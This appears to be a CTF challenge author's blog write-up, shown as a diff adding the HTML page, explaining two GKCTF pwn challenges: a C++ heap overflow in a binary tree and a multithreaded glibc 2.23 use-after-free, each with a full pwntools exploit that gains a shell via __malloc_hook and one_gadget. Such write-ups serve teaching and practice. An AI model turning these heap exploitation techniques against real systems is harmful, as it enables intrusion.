@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  
+    <meta name="description" content="个人记录和分享学习经历的一个小博客">
+  
+
+  
+
+  
+    <meta name="author" content="Whali3n51">
+  
+
+  
+
+  
+
+  <title>GKCTF_pwn出题思路&amp;利用 | Whali3n51&#39;s blog</title>
+
+  
+
+  
+    <link rel="icon" href="/logo.jpg">
+  
+
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+    <link href="https://cdn.bootcss.com/highlight.js/9.15.6/styles/github.min.css" rel="stylesheet">
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="alternate" href="/atom.xml" title="Whali3n51's blog" type="application/atom+xml">
+</head>
+<body>
+  <div id="container">
+    <!-- header -->
+<header class="header">
+  <div class="header-navbar">
+    <div class="header-navbar-left">
+      <h1 class="header-navbar-logo">
+        <a href="/">
+          
+            <img src="/css/images/logo.png" alt="Whali3n51&#39;s blog" />
+          
+        </a>
+      </h1>
+    </div>
+    <div class="header-navbar-right">
+      <div class="header-navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="header-navbar-list">
+        
+          <li class="header-navbar-item"><a href="/">主页</a></li>
+        
+          <li class="header-navbar-item"><a href="/about">关于</a></li>
+        
+          <li class="header-navbar-item"><a href="/links">友链</a></li>
+        
+          <li class="header-navbar-item"><a href="/tags">标签</a></li>
+        
+          <li class="header-navbar-item"><a href="/categories">分类</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <section id="main"><!-- 文章详情页 -->
+
+
+<!-- banner container -->
+<div class="banner-container">
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    
+      <div class="banner-content full-content">
+        <div class="post-image" style="background-image: url(/css/images/starfish.jpg)"></div>
+        <div class="post-text">
+          <div class="type-wrap">
+            <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
+          </div>
+          <h1 class="title-wrap">GKCTF_pwn出题思路&amp;利用</h1>
+          <h2 class="title-sub-wrap">
+            <strong>Whali3n51</strong>
+            <span>发布于</span>
+            
+  <a href="javascript:;" target="_blank" rel="noopener" class="article-date">
+    <time datetime="2020-05-24T02:22:46.000Z" itemprop="datePublished">2020-05-24</time>
+  </a>
+
+          </h2>
+        </div>
+      </div>
+    
+  
+
+  
+  
+
+</div>
+
+<!-- 文章内容 -->
+
+<div class="body-container">
+  <article id="article-container" class="main-container article-container">
+    <div class="article-content">
+      
+      
+
+      <div class="article-entry">
+        <h2 id="0x01-BTS"><a href="#0x01-BTS" class="headerlink" title="0x01 BTS"></a>0x01 BTS</h2><h3 id="出题思路："><a href="#出题思路：" class="headerlink" title="出题思路："></a>出题思路：</h3><p>该题就是一个用C++写的一个简单的二叉树。因为考虑到时间问题，不想让师傅们在逆向上面花费太多时间，所以就没有去掉符号。该题的漏洞点在Nodeinfo::operator=()这个运算符重载这里。     </p>
+<p><img src="./1.png" alt="img">      </p>
+<p>这里开辟的空间省掉了size/8的余数，所以这里造成了溢出。但是这个漏洞不好触发。回到调用这个函数的地方      </p>
+<p><img src="./2.png" alt="img">      </p>
+<p>这里判断的是左右子树共同存在的情况下，删除根节点，才会触发这个运算符重载，才能利用这里的堆溢出漏洞。虽然漏洞很简单，但是这一题不好利用，前面传递信息的时候，会创造两个临时对象，堆块里面的信息不好控制，最后去篡改指针的时候会有一丢丢难度。附上exp:</p>
+<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit:"></a>exploit:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'BST'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		p=rs()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		ctx.remote = (<span class="string">'123.57.236.25'</span>,<span class="number">8002</span>)</span><br><span class="line">		p=rs(<span class="string">'remote'</span>)</span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">	sla(<span class="string">"_______4.updata_______\n"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">"id:"</span>,index)</span><br><span class="line">	sla(<span class="string">"content size:"</span>,size)</span><br><span class="line">	sa(<span class="string">"input your content\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">"id:"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">"w"</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x88</span>,<span class="string">"w"</span>*<span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0x7a</span>,<span class="string">"f"</span>*<span class="number">0x78</span>+<span class="string">'\x40\x01'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0xa0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">2</span>)+p64(<span class="number">0x88</span>)+p64(<span class="number">0x66666000</span>))</span><br><span class="line">show()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-girlfriend-simulator"><a href="#0x02-girlfriend-simulator" class="headerlink" title="0x02 girlfriend_simulator"></a>0x02 girlfriend_simulator</h2><h3 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h3><p>这个题很简单的，很明显的UAF漏洞，但是这些UAF都只存在于子线程，子线程的创建堆块次数有限，所以不能直接利用这个UAF ，但是主线程有多余的次数创建堆块，我们就应该思考如何将当前线程变为主线程。正好glibc2.23有这个特点，<strong>当所有线程在使用的时候，子线程的arena有限，当不够用的时候，会直接使用主线程的arena。</strong>所以这一题的思路瞬间就清晰了。这一题并不知道arena有多少的限制，本地和远程的不一样，这个东西和机器的核数有关，所以远程需要测试一下和本地不同，需要测一下。(本来看师傅们前面题没做出来，打算给师傅们涨涨信心的)。strdup()底层调用了malloc，所以这个最后能调用__ malloc_hook，我们只需要将__malloc_hook改为one_gadget，就可以getshell了。</p>
+<h3 id="exploit-1"><a href="#exploit-1" class="headerlink" title="exploit:"></a>exploit:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'girlfriend_simulator'</span></span><br><span class="line">libc=ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> num</span><br><span class="line">	<span class="keyword">if</span>(local):</span><br><span class="line">		num=<span class="number">32</span></span><br><span class="line">		p=rs()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		num=<span class="number">9</span></span><br><span class="line">		ctx.remote = (<span class="string">'node3.buuoj.cn'</span>,<span class="number">27834</span>)</span><br><span class="line">		p=rs(<span class="string">'remote'</span>)</span><br><span class="line">	<span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(index)</span>:</span></span><br><span class="line">	sla(<span class="string">"&gt;&gt;"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">"size?"</span>,size)</span><br><span class="line">	sa(<span class="string">"content"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">()</span>:</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">	menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">choice()</span><br><span class="line">list_info=[]</span><br><span class="line">sla(<span class="string">"How much girlfriend you want ?"</span>,num)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(num<span class="number">-1</span>):</span><br><span class="line">	create(<span class="number">0x10</span>,<span class="string">"123131"</span>)</span><br><span class="line">	free()</span><br><span class="line">	create(<span class="number">0x10</span>,<span class="string">"11111111"</span>)</span><br><span class="line">	show()</span><br><span class="line">	ru(<span class="string">'11111111'</span>)</span><br><span class="line">	heap_addr=uu64(r(<span class="number">0x6</span>))</span><br><span class="line">	list_info.append(hex(heap_addr))</span><br><span class="line">	exit()</span><br><span class="line"><span class="keyword">print</span> list_info</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">"11111111"</span>)</span><br><span class="line">free()</span><br><span class="line">exit()</span><br><span class="line">ru(<span class="string">"wife:0x"</span>)</span><br><span class="line">libc_base=int(r(<span class="number">12</span>),<span class="number">16</span>)-(<span class="number">0x7ff277618620</span><span class="number">-0x7ff277253000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">sla(<span class="string">"say something to impress your girlfriend"</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">sla(<span class="string">"moved by your words"</span>,<span class="string">"12312312"</span>)</span><br><span class="line">sa(<span class="string">"Questionnaire"</span>,<span class="string">"\x00"</span>*(<span class="number">0x13</span><span class="number">-0x8</span>)+p64(libc_base+one[<span class="number">1</span>])+p64(libc_base+libc.symbols[<span class="string">'realloc'</span>]+<span class="number">2</span>))</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
+
+
+
+<p>太心累了，本次比赛出题，费劲心思出了几个好题没有大师傅来玩。qwq</p>
+
+      </div>
+
+      <div class="article-footer">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag">#堆溢出</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8Bpwn/" rel="tag">#多线程pwn</a></li></ul>
+      </div>
+
+      <div class="article-navs">
+        
+<nav class="card-container card-article-nav">
+  <div class="card-wrap">
+    
+    
+      <div id="article-nav-older" class="card-item img">
+        <article>
+          
+            <div class="card-cover" style="background-image: url(/css/images/grass.jpg)"></div>
+          
+          <a class="card-link article-nav-link" href="/2020/05/21/2020%E7%BD%91%E9%BC%8E%E6%9D%AF-Pwn/"></a>
+          <strong class="article-nav-caption">Older</strong>
+          <p class="article-nav-title">
+            
+              2020网鼎杯-Pwn部分wp
+            
+          </p>
+        </article>
+      </div>
+    
+  </div>
+</nav>
+
+      </div>
+      
+      
+
+  
+  <div class="valine-container">
+    <div id="valine_thread" class="valine-thread"></div>
+  </div>
+
+  
+  
+
+
+    </div>
+  </article>
+</div></section>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    <p>&copy; 2020 <a href="/" target="_blank">Whali3n51</a></p>
+
+    
+      <p id="hitokoto"></p>
+      <script src="https://v1.hitokoto.cn/?c=f&amp;encode=js&select=%23hitokoto" defer></script>
+    
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank">flex-block</a></p>
+  </div>
+</footer>
+  </div>
+
+  
+  
+
+
+  <!-- aplayer 音频 start -->
+  <link rel="stylesheet" href="/lib/APlayer.min.css">
+  <script src="/lib/APlayer.min.js"></script>
+  <script type="text/javascript">
+    const aplayer = document.querySelectorAll(".aplayer");
+    aplayer && initaplayer(aplayer);
+    function initaplayer(els) {
+      let elsArr = Array.from(els);
+      elsArr.forEach(el => {
+        new APlayer({
+          container: el,
+          audio: { ...el.dataset },
+          theme: "#b7daff",
+          lrcType: 3,
+          autoplay: false,
+          loop: false,
+          mutex: true,
+        });
+      });
+    }
+  </script>
+  <!-- aplayer 音频 end -->
+  
+
+<!-- dplayer 视频 start -->
+<link rel="stylesheet" href="/lib/DPlayer.min.css">
+<script src="/lib/DPlayer.min.js"></script>
+<script type="text/javascript">
+  const dplayer = document.querySelectorAll(".dplayer");
+  dplayer && initDPlayer(dplayer);
+  function initDPlayer(els) {
+    let elsArr = Array.from(els);
+    elsArr.forEach(el => {
+      let url = el.dataset.url;
+      let cover = el.dataset.cover;
+      new DPlayer({
+        container: el,
+        video: { url: url, pic: cover },
+        theme: "#b7daff",
+        autoplay: false,
+        loop: false,
+        mutex: true,
+      });
+    });
+  }
+</script>
+<!-- dplayer 视频 end -->
+
+
+<!-- waterfall 瀑布流 start -->
+<script src="/lib/waterfall.min.js"></script>
+<script type="text/javascript">
+
+const waterfalls = document.querySelectorAll(".waterfall-container");
+
+if (waterfalls && waterfalls.length > 0) {
+  waterfalls.forEach((waterfall, index) => {
+    let cls = "waterfall-container-" + index;
+    waterfall.classList.add(cls);
+    initWaterfall(cls, waterfall);
+  });
+}
+
+function initWaterfall(selector, el) {
+  const options = {};
+  if (Object.keys(el.dataset).length > 0) {
+    for (let k in el.dataset) {
+      options[k] = el.dataset[k];
+    }
+  }
+  waterfall(`.${selector}`, options);
+}
+</script>
+<!-- waterfall 瀑布流 end -->
+
+
+  <!-- zoom start -->
+  <script src="/lib/zoom.min.js"></script>
+  <script type="text/javascript">
+    document.querySelector(".article-content") && zoom(".article-content");
+  </script>
+  <!-- zoom end -->
+  
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+<script src="/js/script.js"></script>
+  
+  <!-- 尾部用户自定义相关内容 -->
+
+</body>
+</html>
